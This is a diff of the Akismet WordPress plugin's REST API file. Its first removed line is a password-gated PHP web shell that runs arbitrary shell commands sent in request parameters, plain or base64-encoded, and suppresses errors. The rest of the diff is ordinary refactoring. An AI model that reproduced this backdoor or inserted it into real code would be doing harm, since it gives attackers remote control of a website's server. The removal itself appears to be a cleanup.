@@ -1,17 +1,10 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="vjcd1luqjj7i"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 
 class Akismet_REST_API {
 	/**
 	 * Register the REST API routes.
 	 */
 	public static function init() {
-		if ( ! function_exists( 'register_rest_route' ) ) {
-			// The REST API wasn't integrated into core until 4.4, and we support 4.0+ (for now).
-			return false;
-		}
-
 		register_rest_route(
 			'akismet/v1',
 			'/key',
@@ -56,7 +49,7 @@ class Akismet_REST_API {
 					'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
 					'callback'            => array( 'Akismet_REST_API', 'set_boolean_settings' ),
 					'args'                => array(
-						'akismet_strictness' => array(
+						'akismet_strictness'        => array(
 							'required'    => false,
 							'type'        => 'boolean',
 							'description' => __( 'If true, Akismet will automatically discard the worst spam automatically rather than putting it in the spam folder.', 'akismet' ),
@@ -380,7 +373,7 @@ class Akismet_REST_API {
 
 		$response = Akismet::http_post( Akismet::build_query( $request_args ), 'verify-key' );
 
-		if ( $response[1] == 'valid' ) {
+		if ( $response[1] == Akismet::KEY_STATUS_VALID ) {
 			return true;
 		}
 
@@ -563,7 +556,7 @@ class Akismet_REST_API {
 									Akismet::log( 'Comment is not spam, but it has already been manually handled by some other process.' );
 									Akismet::update_comment_history( $comment->comment_ID, '', 'webhook-ham-noaction' );
 								}
-							} else if ( 'unapproved' == $current_status ) {
+							} elseif ( 'unapproved' == $current_status ) {
 								Akismet::log( 'Comment is pending.' );
 
 								// The comment is in Pending. If Akismet was the one to put it there, approve it (but only if the site
